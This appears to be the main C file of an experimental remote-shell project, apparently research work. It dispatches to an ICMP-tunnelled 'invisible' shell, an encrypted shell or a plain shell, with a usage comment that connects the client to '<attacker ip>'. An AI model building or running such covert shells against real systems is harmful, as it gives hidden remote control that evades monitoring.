#include <stdlib.h>
#include <stdio.h>
#include "invisible_shell.h"
#include "secure_shell.h"
#include "shell.h"

#include "client.h"
#include "server.h"

#define SECURE
//#define INVISIBLE


// sudo tcpdump -nnXSs 0 -i lo icmp
// sudo ./remote_shell_exe c <attacker ip>
// sudo ./remote_shell_exe s <target ip>


// add authentication: 2 types: password manager and authorized server
// docker cont with 2 comp versions each: correct and wrong
// add google doc: table with compiler bugs share it with Cristian and Luis
// document difficulties you find in general

int main (int argc, char **argv)
{

  printf("%s\n", "This is an experimental remote shell.");
  if (!argv[1])
   {
     fprintf(stderr, "%s\n", "No arguments have been specified.");
     return EXIT_FAILURE;
   }

  if('c' == argv[1][0] && !argv[2])
   {
     fprintf(stderr, "%s\n", "Wrong number of arguments:"
     "For client specify IP address and port number.");
     return EXIT_FAILURE;
   }
  else if (!argv[1])
   {
     fprintf(stderr, "%s\n", "Wrong number of arguments:"
     "Specify server port.");
     return EXIT_FAILURE;
   }

  #ifdef INVISIBLE
      printf("%s\n", "INVISIBLE");
      int i = 1;
      net_read = net_read_icmp;
      net_write = net_write_icmp;;
      if (argv[i][0] == 's')
        invisible_shell (raw_init (argv[i+1], IPPROTO_ICMP));
      else if (argv[i][0] == 'c')
        async_read_invisible (raw_init (argv[i+1], IPPROTO_ICMP), 0);
  #else
    #ifdef SECURE
       printf("%s\n", "SECURE");
       if (argv[1][0] == 'c')
           secure_shell (client_init (argv[2], atoi(argv[3])));
       else if (argv[1][0] == 's')
           secure_shell (server_init (atoi(argv[2])));
       else if (argv[1][0] == 'a')
           async_read (client_init (argv[2], atoi(argv[3])), 0);
       else if (argv[1][0] == 'b')
           async_read (server_init (atoi(argv[2])), 0);
    #else
        printf("%s\n", "NOT SECURE");
        if (argv[1][0] == 'c')
          start_shell (client_init (argv[2], atoi(argv[3])));
        else
          start_shell (server_init (atoi(argv[2])));
    #endif
  #endif

  return 0;
}
